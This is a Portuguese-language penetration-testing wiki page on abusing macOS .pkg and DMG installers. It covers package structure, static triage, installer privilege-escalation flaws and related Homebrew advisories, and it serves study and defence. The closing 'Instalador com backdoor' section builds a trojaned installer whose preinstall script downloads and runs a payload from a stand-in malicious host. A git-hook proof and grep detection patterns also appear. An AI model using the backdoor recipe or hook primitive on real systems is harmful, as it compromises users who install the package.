# Abuso de Installers

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas de Pkg

Um **installer package** do macOS (também conhecido como arquivo `.pkg`) é um formato de arquivo usado pelo macOS para **distribuir software**. Esses arquivos são como uma **caixa que contém tudo o que um software** precisa para ser instalado e executado corretamente.

O próprio arquivo do package é um archive que contém uma **hierarquia de arquivos e diretórios que serão instalados no** computador de destino. Ele também pode incluir **scripts** para executar tarefas antes e depois da instalação, como configurar arquivos de configuração ou remover versões antigas do software.

### Estrutura do Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizações (título, texto de boas-vindas…) e verificações de scripts/instalação
- **PackageInfo (xml)**: Informações, requisitos de instalação, local de instalação e caminhos para scripts a serem executados
- **Bill of materials (bom)**: Lista de arquivos a serem instalados, atualizados ou removidos, com permissões de arquivo
- **Payload (CPIO archive gzip compressed)**: Arquivos a serem instalados no `install-location` do PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts de pré e pós-instalação e mais recursos extraídos para um diretório temporário para execução.

### Descompactar
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar o conteúdo do instalador sem descompactá-lo manualmente, você também pode usar a ferramenta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Atalhos para triagem estática

Se o objetivo for realizar uma análise, tente **evitar abrir o pacote primeiro com `Installer.app`**. Alguns pacotes podem executar código assim que o Installer os abre (por exemplo, por meio de `system.run()` ou de plug-ins do instalador); portanto, a extração offline geralmente é o ponto de partida mais seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informações básicas sobre DMG

Arquivos DMG, ou Apple Disk Images, são um formato de arquivo usado pelo macOS da Apple para imagens de disco. Um arquivo DMG é essencialmente uma **imagem de disco montável** (contém seu próprio filesystem) que contém dados de bloco brutos, normalmente compactados e, às vezes, criptografados. Quando você abre um arquivo DMG, o macOS o **monta como se fosse um disco físico**, permitindo acessar seu conteúdo.

> [!CAUTION]
> Observe que os instaladores **`.dmg`** suportam **tantos formatos** que, no passado, alguns deles que continham vulnerabilidades foram abusados para obter **execução de código no kernel**.

### Estrutura da imagem de disco

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

A hierarquia de um arquivo DMG pode variar com base no conteúdo. No entanto, para DMGs de aplicativos, ela geralmente segue esta estrutura:

- Nível superior: esta é a raiz da imagem de disco. Ela geralmente contém o aplicativo e possivelmente um link para a pasta Applications.
- Aplicativo (.app): este é o aplicativo propriamente dito. No macOS, um aplicativo normalmente é um pacote que contém vários arquivos e pastas individuais que compõem o aplicativo.
- Link para Applications: este é um atalho para a pasta Applications no macOS. O objetivo é facilitar a instalação do aplicativo. Você pode arrastar o arquivo .app para este atalho para instalar o app.

## Privesc via abuso de pkg

### Execução a partir de diretórios públicos

Se um script de pré ou pós-instalação executar um arquivo como **`/var/tmp/Installerutil`** e um atacante puder substituir esse arquivo, ele poderá escalar privilégios quando o installer o invocar. As talks e o walkthrough citados mostram variantes desse padrão inseguro de script externo.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta é uma [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que vários installers e updaters chamarão para **executar algo como root**. Essa função aceita o **path** do **file** a ser **executado** como parâmetro; no entanto, se um atacante puder **modificar** esse arquivo, ele poderá **abusar** de sua execução com root para **escalar privilégios**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para obter mais informações, consulte esta palestra: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Ambiente e abuso de shebang

Bugs modernos do PackageKit mostraram que os scripts de instalação frequentemente são executados como **código root confiável**, mantendo ao mesmo tempo um contexto controlado pelo atacante nas proximidades. Ao auditar pacotes de fornecedores, preste atenção especial a:

- Interpretadores de Shell, como `#!/bin/zsh` / `#!/bin/bash`
- Chamadas como `sudo -u $USER`, `launchctl asuser` ou qualquer lógica que confie em `$USER`, `$HOME`, `PATH`, `TMPDIR` ou caminhos relativos
- Interpretadores que não sejam de Shell e que possam carregar arquivos de inicialização ou bibliotecas controlados pelo usuário
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para o bug de ambiente root do PackageKit de 2024 (herança de `~/.zshenv` / `~/.bash*` durante instalações iniciadas pelo usuário), consulte [a página genérica de macOS privesc](../macos-privilege-escalation.md). Se o pacote for **assinado pela Apple**, o mesmo bug de script pode se tornar **relevante para SIP/TCC**, pois `system_installd` pode carregar `com.apple.rootless.install.heritable`; consulte [a página sobre SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Entradas com estado e callbacks implícitos

Não restrinja a análise à injeção de comandos óbvia. Um `preinstall`/`postinstall` executado como root pode atravessar um limite de confiança sempre que consumir **estado existente antes da instalação**: arquivos previsíveis em `/tmp` ou `/var/tmp`, uma árvore de instalação existente e gravável pelo usuário, arquivos de configuração, metadados de repositório ou um nome de usuário posteriormente passado para `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Duas falhas recentes nos instaladores do Homebrew ilustram variantes reutilizáveis:

- **Propriedade selecionada pelo atacante:** uma substituição do usuário do pacote era lida de `/var/tmp/.homebrew_pkg_user.plist`, que era previsível, sem validar seu proprietário, modo, ACLs, estado de symlink ou procedência. Um usuário com poucos privilégios poderia selecionar sua própria conta, e um `postinstall` posterior executado como root transferiria recursivamente a propriedade da árvore e do cache do Homebrew para essa conta. Essa foi uma falha de atribuição de privilégios, não uma injeção de shell.<sup>[[9]](#references)</sup>
- **Callbacks de ferramentas a partir de uma árvore existente:** um `postinstall` executado como root rodava `git checkout` dentro de uma instalação que era intencionalmente gravável pelo usuário normal. Portanto, inserir um `.git/hooks/post-checkout` executável convertia uma atualização posterior de pacote via GUI/MDM em execução de código como root. No caminho Intel, mesclar o diretório `.git` empacotado ao repositório existente também preservava hooks adicionados pelo atacante.<sup>[[10]](#references)</sup>

A segunda primitiva é fácil de modelar durante um teste autorizado; o acionamento ocorre somente quando o instalador vulnerável e privilegiado executa posteriormente uma operação do Git capaz de acionar hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Expanda os pacotes aninhados e mapeie cada fonte controlada pelo atacante para um sink privilegiado. Além da execução direta, procure parsers, alterações de propriedade e ferramentas com mecanismos de plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Para hardening, mova as entradas privilegiadas para um diretório de staging pertencente ao root e valide cada caminho imediatamente antes do uso (arquivo regular, proprietário/modo esperados, nenhuma ACL insegura e nenhum traversal de symlink). Evite alterar recursivamente a propriedade a partir de uma identidade não confiável. Quando o Git precisar ser executado sobre uma árvore preexistente, suprima explicitamente os callbacks (por exemplo, `git -c core.hooksPath=/dev/null ...`) ou substitua atomicamente os metadados do repositório antes de invocar o Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Execução por montagem

Se um instalador gravar em `/tmp/fixedname/bla/bla`, é possível **criar uma mount** sobre `/tmp/fixedname` com noowners, permitindo **modificar qualquer arquivo durante a instalação** para abusar do processo de instalação.

Um exemplo disso é a **CVE-2021-26089**, que conseguiu **sobrescrever um script periódico** para obter execução como root. Para mais informações, consulte a talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg como malware

### Payload vazio

É possível simplesmente gerar um arquivo **`.pkg`** com **scripts de pre e post-install** sem nenhum payload real além do malware dentro dos scripts.<sup>[[2]](#references)</sup>

### JS em Distribution xml

É possível adicionar tags **`<script>`** ao arquivo **distribution xml** do pacote, e esse código será executado e poderá **executar comandos** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Em pacotes de distribuição, isso geralmente depende de o arquivo `Distribution` de nível superior habilitar scripts externos, por exemplo, com `allow-external-scripts="true"`. Portanto, revisar apenas `preinstall` / `postinstall` não é suficiente: o próprio **Distribution XML** pode conter hooks `installation-check` / `volume-check` e caminhos de execução diretos para `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Instalador com backdoor

Instalador malicioso usando um script e código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Desempacotando Pkgs: Uma análise interna dos pacotes de instalação do MacOS e falhas de segurança comuns](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "O mundo selvagem dos instaladores do macOS" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Desempacotando Pkgs: Uma análise interna dos pacotes de instalação do MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming no macOS: Explorando pacotes de instalação](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Escalonamento de privilégios do PackageKit no macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Quebrando o SIP com pacotes assinados pela Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Montanha de bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Morte por 1000 instaladores no macOS e tudo está quebrado!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Instalador do Homebrew para macOS confia em um plist package-user controlado pelo usuário](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Execução de código como root por meio de Git hooks em um postinstall de PKG do macOS](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
